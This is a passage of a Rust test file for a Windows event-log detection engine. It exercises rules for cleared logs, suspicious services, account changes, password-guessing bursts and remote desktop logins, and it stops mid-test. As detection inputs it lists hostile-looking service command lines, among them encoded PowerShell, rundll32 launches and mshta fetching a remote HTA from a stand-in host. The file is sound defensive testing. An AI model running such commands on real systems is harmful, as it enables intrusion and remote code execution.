//! Les règles `EVT-` sur des événements fabriqués ici (jamais un vrai journal de la maison) : pour chacune, ce
//! qu'elle doit trouver, ce qu'elle doit laisser, et ce qui la rend non vérifiée ; le moteur contre l'ordre de
//! lecture (proptest) et ses bornes ; puis tout le jeu sur les échantillons publics (`VANGUARD_EVTX_ECHANTILLONS`,
//! jamais dans le dépôt), pour mesurer ce qu'il y trouve.

use std::collections::BTreeSet;
use std::sync::atomic::{AtomicU64, Ordering};

use chrono::{DateTime, Duration, Utc};
use proptest::prelude::*;

use super::jeu::{
    JOURNAUX, Lieu, REGLES, actions_de_tache, adresse_inhabituelle, lieu, ligne_suspecte, script_suspect,
    service_suspect, tache_suspecte,
};
use super::moteur::{
    BornesMoteur, EtatJournal, Gravite, Jugement, Lecture, Manque, Moteur, Options, Reserve, Trouvaille,
};
use super::resultat::{self, Analyse, Source};
use crate::journaux_windows::evenement::{EvenementWindows, Origine};
use crate::journaux_windows::evtx::Bornes;
use crate::journaux_windows::trous::{Nature, Numerotation, Suite, Trou};

static NUMERO: AtomicU64 = AtomicU64::new(1);

fn t0() -> DateTime<Utc> {
    DateTime::parse_from_rfc3339("2026-10-18T14:00:00Z").unwrap().to_utc()
}

/// Un événement fabriqué : journal, fournisseur, numéro, secondes après `t0`, champs.
fn ev(journal: &str, fournisseur: &str, id: u32, s: i64, champs: &[(&str, &str)]) -> EvenementWindows {
    EvenementWindows {
        journal: journal.into(),
        id,
        niveau: Some(4),
        date: Some(t0() + Duration::seconds(s)),
        ordinateur: "poste-alice".into(),
        numero: Some(NUMERO.fetch_add(1, Ordering::Relaxed)),
        fournisseur: fournisseur.into(),
        utilisateur: None,
        champs: champs
            .iter()
            .map(|(n, v)| ((*n).to_string(), (*v).to_string()))
            .collect(),
        origine: Origine::Vivant,
        verifie: true,
    }
}

const AUDIT: &str = "Microsoft-Windows-Security-Auditing";
const SCM: &str = "Service Control Manager";

fn sec(id: u32, s: i64, champs: &[(&str, &str)]) -> EvenementWindows {
    ev("Security", AUDIT, id, s, champs)
}

/// Un événement tiré d'un XML à la forme de celui de Windows, par la même extraction que la source vivante.
fn du_xml(x: &str) -> EvenementWindows {
    let (e, _) = crate::journaux_windows::xml::enregistrement(x, &Bornes::default()).unwrap();
    EvenementWindows::depuis(e, Origine::Vivant).unwrap()
}

/// Tous les journaux des règles, lus en entier.
fn tout_lu() -> Vec<EtatJournal> {
    JOURNAUX
        .iter()
        .map(|j| EtatJournal {
            nom: (*j).to_string(),
            lecture: Lecture::Lu(Vec::new()),
            active: Some(true),
            principal: true,
            suites: Vec::new(),
        })
        .collect()
}

fn options() -> Options {
    Options {
        depuis: None,
        defender_antivirus: Some(true),
        installation: None,
    }
}

/// Ce qu'écrit tout ordinateur en marche : une ouverture de session d'un service (Security) et un service démarré
/// (System). Sans eux, Security et System lus mais vides rendent leurs règles non vérifiées (`Manque::Vide`). Et un
/// événement sans conséquence dans chaque autre journal : lu mais vide, un journal calme rend lui aussi ses règles non
/// vérifiées (`Manque::VideCalme`).
fn ordinaire() -> Vec<EvenementWindows> {
    let mut v = vec![
        sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
        // Un processus ordinaire, sa ligne de commande journalisée : l'audit de EVT-PRC-001 est allumé.
        sec(
            4688,
            0,
            &[
                ("NewProcessName", "C:\\Windows\\System32\\notepad.exe"),
                ("CommandLine", "notepad.exe C:\\Users\\alice\\notes.txt"),
            ],
        ),
        ev(
            "System",
            SCM,
            7036,
            0,
            &[("param1", "Windows Update"), ("param2", "running")],
        ),
    ];
    v.extend(
        JOURNAUX
            .iter()
            .filter(|j| !matches!(**j, "Security" | "System"))
            .map(|j| ev(j, "Microsoft-Windows-Essai", 65_000, 0, &[])),
    );
    v
}

fn juger_nu(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
    let mut m = Moteur::nouveau(REGLES, options, BornesMoteur::default());
    for e in evs {
        m.recevoir(e);
    }
    m.conclure(etats)
}

fn juger_avec(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
    let mut tous = ordinaire();
    tous.extend_from_slice(evs);
    juger_nu(&tous, etats, options)
}

fn juger(evs: &[EvenementWindows]) -> Vec<Jugement> {
    juger_avec(evs, &tout_lu(), options())
}

fn regle<'a>(js: &'a [Jugement], id: &str) -> &'a Jugement {
    js.iter().find(|j| j.regle.id == id).unwrap()
}

fn trouvailles<'a>(js: &'a [Jugement], id: &str) -> &'a [Trouvaille] {
    &regle(js, id).trouvailles
}

fn gravites(js: &[Jugement], id: &str) -> Vec<Gravite> {
    trouvailles(js, id).iter().map(|t| t.gravite).collect()
}

// ---------------------------------------------------------------------------------------------------------------
// Le jeu lui-même
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn chaque_regle_est_bien_formee() {
    let mut vus = BTreeSet::new();
    for r in REGLES {
        assert!(crate::modele::id::bien_forme(r.id), "{}", r.id);
        assert!(r.id.starts_with("EVT-"), "{}", r.id);
        assert!(vus.insert(r.id), "{} deux fois", r.id);
        assert!(!r.sujet.0.is_empty() && !r.sujet.1.is_empty());
        assert!(!r.techniques.is_empty(), "{} sans technique", r.id);
        assert!(r.techniques.iter().all(|t| t.starts_with('T')), "{}", r.id);
        assert!(
            r.references
                .iter()
                .any(|u| u.starts_with("https://learn.microsoft.com/")),
            "{} : la documentation de Microsoft",
            r.id
        );
        assert!(
            r.references
                .iter()
                .any(|u| u.starts_with("https://attack.mitre.org/techniques/")),
            "{} : la page d'ATT&CK",
            r.id
        );
        for v in r.volets {
            assert!(
                v.journal.is_empty() || JOURNAUX.contains(&v.journal),
                "{} : {}",
                r.id,
                v.journal
            );
        }
    }
    assert_eq!(REGLES.len(), 13);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-EFF-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn journal_de_securite_efface() {
    let x = "<Event><System><Provider Name='Microsoft-Windows-Eventlog'/><EventID>1102</EventID><Level>4</Level>\
             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>1087729</EventRecordID>\
             <Channel>Security</Channel><Computer>poste-alice</Computer></System><UserData>\
             <LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>\
             <SubjectUserSid>S-1-5-21-1-2-3-1001</SubjectUserSid><SubjectUserName>bob</SubjectUserName>\
             <SubjectDomainName>POSTE-ALICE</SubjectDomainName><SubjectLogonId>0x55cd1d</SubjectLogonId>\
             </LogFileCleared></UserData></Event>";
    let js = juger(&[du_xml(x)]);
    let t = trouvailles(&js, "EVT-EFF-001");
    assert_eq!(t.len(), 1);
    assert_eq!(t[0].gravite, Gravite::Alerte);
    assert!(t[0].details.iter().any(|(_, v)| v == "POSTE-ALICE\\bob"));
    // Un 1102 d'un autre fournisseur (un programme qui écrit dans le journal de sécurité sous un faux nom) n'est pas
    // celui de Windows.
    let faux = ev("Security", "Faux", 1102, 0, &[]);
    assert_eq!(trouvailles(&juger(&[faux]), "EVT-EFF-001"), []);
}

#[test]
fn journal_efface_par_104() {
    let e = ev(
        "System",
        "Microsoft-Windows-Eventlog",
        104,
        0,
        &[
            ("SubjectUserName", "bob"),
            ("Channel", "Microsoft-Windows-Sysmon/Operational"),
        ],
    );
    let js = juger(&[e]);
    let t = trouvailles(&js, "EVT-EFF-001");
    assert_eq!(t[0].objet, "microsoft-windows-sysmon/operational|2026-10-18T14:00:00");
    // Pas un 104 de RdpCoreTS (un autre sens dans un autre journal).
    let autre = ev(
        "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
        "x",
        104,
        0,
        &[],
    );
    assert_eq!(trouvailles(&juger(&[autre]), "EVT-EFF-001"), []);
}

fn suite(trous: Vec<Trou>, non_verifies: u64) -> Suite {
    Suite {
        numerotation: Numerotation::Journal,
        premier: Some(1),
        dernier: Some(1000),
        presents: 900,
        doublons: 0,
        incoherences: 0,
        trous,
        trous_au_dela: 0,
        non_verifies,
    }
}

fn trou(de: u64, a: u64, nature: Nature, avant_s: i64, apres_s: i64) -> Trou {
    Trou {
        de,
        a,
        nature,
        avant: Some(t0() + Duration::seconds(avant_s)),
        apres: Some(t0() + Duration::seconds(apres_s)),
    }
}

fn avec_suite(s: Suite) -> Vec<EtatJournal> {
    let mut etats = tout_lu();
    etats.iter_mut().find(|e| e.nom == "Security").unwrap().suites = vec![s];
    etats
}

#[test]
fn trous_de_numeros_juges_selon_leur_nature() {
    let etats = avec_suite(suite(
        vec![
            trou(10, 12, Nature::Retires, 0, 60),
            trou(100, 199, Nature::Absents, 1000, 1100),
            trou(300, 310, Nature::Absents, 5000, 5600),
            trou(400, 401, Nature::CopieAChaud, 7000, 7100),
            trou(500, 520, Nature::AvantExport, 8000, 8100),
            trou(600, 650, Nature::Illisible, 9000, 9100),
        ],
        0,
    ));
    // Un arrêt inattendu entre 5000 et 5600 : il explique le second trou « Absents », pas le premier.
    let arret = ev("System", "EventLog", 6008, 5300, &[]);
    let js = juger_avec(&[arret], &etats, options());
    let t = trouvailles(&js, "EVT-EFF-001");
    let par_objet = |o: &str| t.iter().find(|x| x.objet == o).unwrap();
    assert_eq!(par_objet("security:10-12").gravite, Gravite::Critique);
    assert_eq!(par_objet("security:100-199").gravite, Gravite::Alerte);
    let explique = par_objet("security:300-310");
    assert_eq!(explique.gravite, Gravite::Info);
    assert!(explique.reserves.contains(&Reserve::ArretInattendu));
    assert!(par_objet("security:400-401").reserves.contains(&Reserve::CopieAChaud));
    assert!(par_objet("security:500-520").reserves.contains(&Reserve::AvantExport));
    // Un trou là où la lecture a perdu quelque chose : non vérifié, jamais une alerte ni un silence.
    assert!(!t.iter().any(|x| x.objet == "security:600-650"));
    assert!(
        regle(&js, "EVT-EFF-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::TrousIllisibles { nombre: 51, .. }))
    );
    // Kernel-Power 41 explique aussi ; un 41 de CAPI2 (un autre événement) non.
    let coupure = ev("System", "Microsoft-Windows-Kernel-Power", 41, 1050, &[]);
    let js = juger_avec(&[coupure], &etats, options());
    assert_eq!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .find(|x| x.objet == "security:100-199")
            .unwrap()
            .gravite,
        Gravite::Info
    );
    // Un arrêt au milieu d'un long trou n'excuse pas ce qui manque avant lui.
    let long = avec_suite(suite(vec![trou(100, 5000, Nature::Absents, 0, 100_000)], 0));
    let milieu = ev("System", "EventLog", 6008, 50_000, &[]);
    assert_eq!(
        gravites(&juger_avec(&[milieu], &long, options()), "EVT-EFF-001"),
        [Gravite::Alerte]
    );
    let capi = ev("System", "Microsoft-Windows-CAPI2", 41, 1050, &[]);
    let js = juger_avec(&[capi], &etats, options());
    assert_eq!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .find(|x| x.objet == "security:100-199")
            .unwrap()
            .gravite,
        Gravite::Alerte
    );
}

#[test]
fn une_suite_qui_ne_tient_qu_a_des_morceaux_abimes_n_est_pas_une_preuve() {
    let js = juger_avec(&[], &avec_suite(suite(Vec::new(), 12)), options());
    let j = regle(&js, "EVT-EFF-001");
    assert_eq!(j.trouvailles, []);
    assert!(!j.verifie());
    assert!(
        j.manques
            .iter()
            .any(|m| matches!(m, Manque::SuiteNonProuvee { nombre: 12, .. }))
    );
}

#[test]
fn numeros_en_double_signales() {
    let mut s = suite(Vec::new(), 0);
    s.doublons = 3;
    let js = juger_avec(&[], &avec_suite(s), options());
    assert_eq!(gravites(&js, "EVT-EFF-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-SRV-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn services_suspects() {
    let critique = [
        r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\x.bat",
        r"C:\Windows\System32\cmd.exe /c whoami",
        r"cmd /c start powershell -nop",
        r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc SQBFAFgA"#,
        r"C:\WINDOWS\SYSTEM32\WINDOW~1\V1.0\POWERS~1.EXE -nop -w hidden",
        r"C:/Windows/System32/rundll32.exe C:\x.dll,Run",
        r"C:\Windows\System32\MSHTA.EXE http://example.test/x.hta",
        r"%SystemRoot%\System32\RUNDLL~1.EXE x.dll,A",
    ];
    for c in critique {
        assert_eq!(service_suspect("svc", c).map(|x| x.0), Some(Gravite::Critique), "{c}");
    }
    let alerte = [
        r"C:\Users\alice\AppData\Local\Temp\svc.exe",
        r#""C:\Users\Public\updater.exe" --service"#,
        r"\??\C:\Users\alice\Downloads\drv.sys",
        r"C:\Windows\Temp\abc.exe",
        r"%TEMP%\x.exe",
        r"\\serveur\partage\svc.exe",
    ];
    for c in alerte {
        assert_eq!(service_suspect("svc", c).map(|x| x.0), Some(Gravite::Alerte), "{c}");
    }
    let rien = [
        r#""C:\Program Files\Mozilla Maintenance Service\maintenanceservice.exe""#,
        r"C:\Program Files (x86)\Steam\bin\steamservice.exe /RunAsService",
        r"\SystemRoot\System32\drivers\WUDFRd.sys",
        r"system32\DRIVERS\BTHUSB.sys",
        r#""C:\Program Files\NVIDIA Corporation\Display.NvContainer\NVDisplay.Container.exe" -s NVDisplay.ContainerLocalSystem"#,
        r"C:\WINDOWS\system32\svchost.exe -k netsvcs -p",
    ];
    for c in rien {
        assert_eq!(service_suspect("svc", c), None, "{c}");
    }
    // Le pilote des mises à jour de Defender, noté par Microsoft ; ailleurs dans ProgramData : à savoir.
    let mpksl = r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{0A1B}\MpKslDrv.sys";
    assert_eq!(service_suspect("MpKsl4f3a2b1c", mpksl), None);
    assert_eq!(service_suspect("autre", mpksl).map(|x| x.0), Some(Gravite::Info));
    assert_eq!(
        service_suspect("x", r"C:\PROGRA~3\Vendor\svc.exe").map(|x| x.0),
        Some(Gravite::Info)
    );
}

#[test]
fn service_installe_et_journal_coupe() {
    let svc = ev(
        "System",
        SCM,
        7045,
        0,
        &[
            ("ServiceName", "XYZsvc"),
            ("ImagePath", r"C:\Windows\System32\cmd.exe /c C:\Users\Public\a.bat"),
            ("ServiceType", "user mode service"),
            ("StartType", "demand start"),
            ("AccountName", "LocalSystem"),
        ],
    );
    let coupe = ev(
        "System",
        SCM,
        7040,
        10,
        &[
            ("param1", "Journal d’événements Windows"),
            ("param2", "démarrage automatique"),
            ("param3", "désactivé"),
            ("param4", "eventlog"),
        ],
    );
    let bits = ev(
        "System",
        SCM,
        7040,
        20,
        &[
            ("param1", "Background Intelligent Transfer Service"),
            ("param2", "demand start"),
            ("param3", "auto start"),
            ("param4", "BITS"),
        ],
    );
    let js = juger(&[svc, coupe, bits]);
    assert_eq!(gravites(&js, "EVT-SRV-001"), [Gravite::Critique, Gravite::Critique]);
    let ordinaire = ev(
        "System",
        SCM,
        7045,
        0,
        &[
            ("ServiceName", "Steam Client Service"),
            (
                "ImagePath",
                r#""C:\Program Files (x86)\Common Files\Steam\steamservice.exe" /RunAsService"#,
            ),
        ],
    );
    assert_eq!(trouvailles(&juger(&[ordinaire]), "EVT-SRV-001"), []);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-ADM-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn comptes_et_groupes() {
    let cache = sec(
        4720,
        0,
        &[("TargetUserName", "aide$"), ("TargetSid", "S-1-5-21-1-2-3-1005")],
    );
    let ordinaire = sec(
        4720,
        1,
        &[("TargetUserName", "carole"), ("TargetSid", "S-1-5-21-1-2-3-1006")],
    );
    // Par le SID, jamais par le nom traduit : « Administrateurs » en français, et un groupe nommé comme lui ne
    // compte pas.
    let admin = sec(
        4732,
        2,
        &[
            ("MemberName", "-"),
            ("MemberSid", "S-1-5-21-1-2-3-1005"),
            ("TargetUserName", "Administrateurs"),
            ("TargetSid", "s-1-5-32-544"),
        ],
    );
    let leurre = sec(
        4732,
        3,
        &[
            ("MemberSid", "S-1-5-21-1-2-3-1006"),
            ("TargetUserName", "Administrators"),
            ("TargetSid", "S-1-5-21-1-2-3-1100"),
        ],
    );
    let utilisateurs = sec(
        4732,
        4,
        &[("MemberSid", "S-1-5-21-1-2-3-1006"), ("TargetSid", "S-1-5-32-545")],
    );
    let bureau = sec(
        4732,
        5,
        &[("MemberSid", "S-1-5-21-1-2-3-1006"), ("TargetSid", "S-1-5-32-555")],
    );
    let js = juger(&[cache, ordinaire, admin, leurre, utilisateurs, bureau]);
    let t = trouvailles(&js, "EVT-ADM-001");
    assert_eq!(t.len(), 4, "{t:#?}");
    assert_eq!(t[0].gravite, Gravite::Critique);
    assert_eq!(t[0].objet, "cree:aide$");
    assert!(t.iter().any(|x| x.objet == "groupe:s-1-5-32-544:s-1-5-21-1-2-3-1005"));
    assert!(t.iter().any(|x| x.objet.starts_with("groupe:s-1-5-32-555")));
    assert!(t.iter().any(|x| x.objet == "cree:carole" && x.gravite == Gravite::Info));
}

#[test]
fn groupes_de_domaine_et_comptes_changes() {
    let domaine = sec(
        4728,
        0,
        &[
            ("MemberSid", "S-1-5-21-9-9-9-1105"),
            ("TargetSid", "S-1-5-21-9-9-9-512"),
        ],
    );
    let aucun = sec(
        4728,
        1,
        &[
            ("MemberSid", "S-1-5-21-9-9-9-1105"),
            ("TargetSid", "S-1-5-21-9-9-9-513"),
        ],
    );
    let active = sec(
        4738,
        2,
        &[
            ("TargetUserName", "Administrateur"),
            ("TargetSid", "S-1-5-21-1-2-3-500"),
            ("OldUacValue", "0x211"),
            ("NewUacValue", "0x210"),
        ],
    );
    // Un compte neuf activé (0x15 → 0x14) : l'ordinaire d'une création par « net user ».
    let neuf = sec(
        4738,
        3,
        &[
            ("TargetUserName", "carole"),
            ("TargetSid", "S-1-5-21-1-2-3-1006"),
            ("OldUacValue", "0x15"),
            ("NewUacValue", "0x14"),
        ],
    );
    let sans_mdp = sec(
        4738,
        4,
        &[
            ("TargetUserName", "carole"),
            ("TargetSid", "S-1-5-21-1-2-3-1006"),
            ("OldUacValue", "0x10"),
            ("NewUacValue", "0x14"),
        ],
    );
    let js = juger(&[domaine, aucun, active, neuf, sans_mdp]);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-ADM-001")
        .iter()
        .map(|t| t.objet.as_str())
        .collect();
    objets.sort_unstable();
    assert_eq!(
        objets,
        [
            "active:s-1-5-21-1-2-3-500",
            "groupe:s-1-5-21-9-9-9-512:s-1-5-21-9-9-9-1105",
            "sans-mot-de-passe:s-1-5-21-1-2-3-1006"
        ]
    );
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-MDP-001
// ---------------------------------------------------------------------------------------------------------------

fn echec(s: i64, compte: &str, ip: &str, type_: &str) -> EvenementWindows {
    sec(
        4625,
        s,
        &[
            ("TargetUserName", compte),
            ("IpAddress", ip),
            ("LogonType", type_),
            ("Status", "0xc000006d"),
            ("SubStatus", "0xc000006a"),
        ],
    )
}

fn reussite(s: i64, compte: &str, ip: &str, type_: &str) -> EvenementWindows {
    sec(
        4624,
        s,
        &[("TargetUserName", compte), ("IpAddress", ip), ("LogonType", type_)],
    )
}

#[test]
fn rafale_d_echecs_puis_reussite() {
    // Dix échecs en neuf minutes, par le Bureau à distance, puis une réussite deux minutes après.
    let mut evs: Vec<EvenementWindows> = (0..10)
        .map(|i| echec(i * 60, "Administrateur", "203.0.113.9", "10"))
        .collect();
    let js = juger(&evs);
    let t = trouvailles(&js, "EVT-MDP-001");
    assert_eq!(t.len(), 2, "par compte et par adresse : {t:#?}");
    assert!(t.iter().all(|x| x.gravite == Gravite::Alerte && x.nombre == 10));
    assert!(t.iter().any(|x| x.objet == "rafale:administrateur") && t.iter().any(|x| x.objet == "rafale:203.0.113.9"));
    evs.push(reussite(660, "administrateur", "203.0.113.9", "10"));
    let js = juger(&evs);
    let critiques: Vec<&Trouvaille> = trouvailles(&js, "EVT-MDP-001")
        .iter()
        .filter(|t| t.gravite == Gravite::Critique)
        .collect();
    assert_eq!(
        critiques.len(),
        1,
        "la réussite suit la rafale du compte (casse comprise)"
    );
    assert_eq!(critiques[0].objet, "apres:administrateur");
    // La réussite qui fonde l'alerte est dans ses repères.
    assert!(critiques[0].reperes.iter().any(|r| r.id == 4624));
    // Le même compte écrit autrement (« POSTE\\Administrateur », « administrateur@poste ») : la même clé.
    let mut autrement: Vec<EvenementWindows> = (0..10)
        .map(|i| {
            echec(
                i * 60,
                if i % 2 == 0 {
                    "POSTE\\Administrateur"
                } else {
                    "administrateur@poste"
                },
                "-",
                "10",
            )
        })
        .collect();
    autrement.push(reussite(660, "Administrateur", "-", "10"));
    let js = juger(&autrement);
    assert!(
        trouvailles(&js, "EVT-MDP-001")
            .iter()
            .any(|t| t.objet == "apres:administrateur")
    );
}

#[test]
fn pas_de_rafale_sans_les_dix_dans_la_fenetre() {
    // Neuf échecs : rien. Dix échecs étalés sur dix-huit minutes : rien. Des tâches au mot de passe périmé (type 4,
    // 5) : rien. Une réussite trente minutes après une rafale : pas « juste après ».
    let neuf: Vec<EvenementWindows> = (0..9).map(|i| echec(i * 10, "alice", "192.168.1.20", "2")).collect();
    assert_eq!(trouvailles(&juger(&neuf), "EVT-MDP-001"), []);
    let etales: Vec<EvenementWindows> = (0..10).map(|i| echec(i * 120, "alice", "192.168.1.20", "3")).collect();
    assert_eq!(trouvailles(&juger(&etales), "EVT-MDP-001"), []);
    let taches: Vec<EvenementWindows> = (0..30).map(|i| echec(i, "svc-sauvegarde", "-", "5")).collect();
    assert_eq!(trouvailles(&juger(&taches), "EVT-MDP-001"), []);
    let mut tard: Vec<EvenementWindows> = (0..10).map(|i| echec(i, "alice", "198.51.100.4", "3")).collect();
    tard.push(reussite(1800, "alice", "198.51.100.4", "3"));
    assert!(
        gravites(&juger(&tard), "EVT-MDP-001")
            .iter()
            .all(|g| *g == Gravite::Alerte)
    );
    // À l'écran (127.0.0.1) : regroupé par compte, pas par adresse ; douze en douze secondes, plus vite qu'une
    // personne ne tape : aussi par ordinateur.
    let ecran: Vec<EvenementWindows> = (0..12).map(|i| echec(i * 2, "alice", "127.0.0.1", "2")).collect();
    let js = juger(&ecran);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-MDP-001")
        .iter()
        .map(|t| t.objet.as_str())
        .collect();
    objets.sort_unstable();
    assert_eq!(objets, ["rafale:*", "rafale:alice"]);
    // Cinq échecs en dix secondes sur des comptes différents (un programme qui essaie) ; quatre : rien.
    let vite: Vec<EvenementWindows> = (0..5).map(|i| echec(i, &format!("c{i}"), "-", "3")).collect();
    assert_eq!(gravites(&juger(&vite), "EVT-MDP-001"), [Gravite::Alerte]);
    assert_eq!(trouvailles(&juger(&vite[..4]), "EVT-MDP-001"), []);
    // Un 4625 d'EventSystem dans Application (un autre événement sous le même numéro).
    let autres: Vec<EvenementWindows> = (0..20)
        .map(|i| ev("Application", "Microsoft-Windows-EventSystem", 4625, i, &[]))
        .collect();
    assert_eq!(trouvailles(&juger(&autres), "EVT-MDP-001"), []);
}

#[test]
fn une_rafale_qui_ne_tient_qu_a_des_morceaux_abimes_est_un_indice() {
    let evs: Vec<EvenementWindows> = (0..10)
        .map(|i| {
            let mut e = echec(i, "alice", "198.51.100.4", "3");
            e.verifie = i < 5;
            e
        })
        .collect();
    let js = juger(&evs);
    let t = trouvailles(&js, "EVT-MDP-001");
    // Par compte (dix en dix minutes) : ne tient qu'avec les abîmés. Par ordinateur (cinq en dix secondes) : les
    // cinq vérifiés suffisent.
    let par_compte = t.iter().find(|x| x.objet == "rafale:alice").unwrap();
    assert!(par_compte.reserves.contains(&Reserve::MorceauAbime) && par_compte.verifies == 0);
    let vite = t.iter().find(|x| x.objet == "rafale:*").unwrap();
    assert!(vite.reserves.is_empty() && vite.verifies == 5);
}

proptest! {
    /// L'ordre de lecture ne fait ni perdre ni inventer une alerte : les mêmes trouvailles (objet, gravité, nombre,
    /// dates, réserves) dans n'importe quel ordre.
    #[test]
    fn l_ordre_ne_change_rien(
        ecarts in proptest::collection::vec((0i64..200, 0usize..3, 0usize..3, any::<bool>(), any::<bool>()), 1..80),
        graine in any::<u64>(),
    ) {
        let comptes = ["alice", "bob", "Administrateur"];
        let ips = ["203.0.113.9", "198.51.100.4", "-"];
        let mut s = 0i64;
        let mut evs = Vec::new();
        for (d, c, a, ok, verifie) in ecarts {
            s += d;
            let mut e = if ok { reussite(s, comptes[c], ips[a], "3") } else { echec(s, comptes[c], ips[a], "3") };
            e.verifie = verifie;
            evs.push(e);
        }
        let resume = |js: &[Jugement]| -> BTreeSet<String> {
            trouvailles(js, "EVT-MDP-001")
                .iter()
                .map(|t| format!("{} {} {:?} {} {:?} {:?} {:?} {}", t.volet, t.objet, t.gravite, t.nombre, t.premier, t.dernier, t.reserves, t.verifies))
                .collect()
        };
        let avant = resume(&juger(&evs));
        // Un mélange déterministe (Fisher-Yates sur un générateur simple) : la graine vient de proptest.
        let mut x = graine | 1;
        for i in (1..evs.len()).rev() {
            x ^= x << 13; x ^= x >> 7; x ^= x << 17;
            let j = usize::try_from(x % (i as u64 + 1)).unwrap();
            evs.swap(i, j);
        }
        prop_assert_eq!(avant, resume(&juger(&evs)));
    }

    /// Une réussite qui suit une rafale, contre un modèle naïf : dix échecs en dix minutes tous dans les quinze
    /// minutes d'avant elle, le dernier au plus cinq minutes avant.
    #[test]
    fn reussite_apres_rafale_comme_le_modele(echecs in proptest::collection::vec(0i64..4000, 0..30), reussites in proptest::collection::vec(0i64..4000, 1..4)) {
        let mut evs: Vec<EvenementWindows> = echecs.iter().map(|&s| echec(s, "alice", "-", "3")).collect();
        evs.extend(reussites.iter().map(|&s| reussite(s, "alice", "-", "3")));
        let mut a = echecs.clone();
        a.sort_unstable();
        let suit = |s: i64| {
            let avant: Vec<i64> = a.iter().copied().filter(|&x| x <= s).collect();
            avant.last().is_some_and(|&d| s - d <= 300)
                && avant.iter().copied().filter(|&x| s - x <= 900).collect::<Vec<_>>().windows(10).any(|w| w[9] - w[0] <= 600)
        };
        let attendu = reussites.iter().filter(|&&s| suit(s)).count() as u64;
        let js = juger(&evs);
        let obtenu = trouvailles(&js, "EVT-MDP-001").iter().filter(|t| t.gravite == Gravite::Critique).map(|t| t.nombre).sum::<u64>();
        prop_assert_eq!(obtenu, attendu);
    }

    /// Les rafales contre un modèle naïf : une clé a une rafale si et seulement si dix de ses échecs tiennent dans dix
    /// minutes.
    #[test]
    fn rafales_comme_le_modele(dates in proptest::collection::vec(0i64..3000, 0..40)) {
        let evs: Vec<EvenementWindows> = dates.iter().map(|&s| echec(s, "alice", "-", "3")).collect();
        let mut triees = dates.clone();
        triees.sort_unstable();
        let attendu = triees.windows(10).any(|w| w[9] - w[0] <= 600);
        let js = juger(&evs);
        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.volet == 0), attendu);
        let vite = triees.windows(5).any(|w| w[4] - w[0] <= 10);
        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "rafale:*"), vite);
    }
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-RDP-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn adresses_classees() {
    for a in [
        "127.0.0.1",
        "::1",
        "10.0.0.4",
        "172.16.9.1",
        "192.168.1.20",
        "169.254.3.3",
        "fe80::1%12",
        "fd12::5",
        "-",
        "",
        "LOCAL",
        "::ffff:192.168.1.5",
    ] {
        assert_eq!(lieu(a), Lieu::Local, "{a}");
    }
    for a in [
        "203.0.113.9",
        "8.8.8.8",
        "2001:db8::1",
        "::ffff:198.51.100.4",
        "172.32.0.1",
    ] {
        assert_eq!(lieu(a), Lieu::Internet, "{a}");
    }
    assert_eq!(lieu("100.101.102.103"), Lieu::Partage);
    assert_eq!(lieu("pas-une-adresse"), Lieu::Illisible);
}

#[test]
fn bureau_a_distance_depuis_l_exterieur() {
    let dehors = sec(
        4624,
        0,
        &[
            ("LogonType", "10"),
            ("IpAddress", "203.0.113.9"),
            ("TargetUserName", "alice"),
        ],
    );
    let maison = sec(
        4624,
        1,
        &[
            ("LogonType", "10"),
            ("IpAddress", "192.168.1.20"),
            ("TargetUserName", "alice"),
        ],
    );
    let reseau = sec(
        4624,
        2,
        &[
            ("LogonType", "3"),
            ("IpAddress", "203.0.113.9"),
            ("TargetUserName", "alice"),
        ],
    );
    // LocalSessionManager 21 et RemoteConnectionManager 1149 : leurs champs sous UserData/EventXML.
    let lsm = du_xml(
        "<Event><System><Provider Name='Microsoft-Windows-TerminalServices-LocalSessionManager'/><EventID>21</EventID>\
         <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>12</EventRecordID>\
         <Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel><Computer>poste-alice</Computer>\
         </System><UserData><EventXML xmlns='Event_NS'><User>POSTE-ALICE\\alice</User><SessionID>2</SessionID>\
         <Address>198.51.100.4</Address></EventXML></UserData></Event>",
    );
    let console = du_xml(
        "<Event><System><Provider Name='Microsoft-Windows-TerminalServices-LocalSessionManager'/><EventID>21</EventID>\
         <TimeCreated SystemTime='2026-10-18T14:06:09Z'/><EventRecordID>13</EventRecordID>\
         <Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel><Computer>poste-alice</Computer>\
         </System><UserData><EventXML xmlns='Event_NS'><User>POSTE-ALICE\\alice</User><SessionID>1</SessionID>\
         <Address>LOCAL</Address></EventXML></UserData></Event>",
    );
    let rcm = ev(
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
        1149,
        5,
        &[("Param1", "alice"), ("Param2", "POSTE"), ("Param3", "174.127.93.2")],
    );
    let tailscale = sec(
        4624,
        6,
        &[
            ("LogonType", "10"),
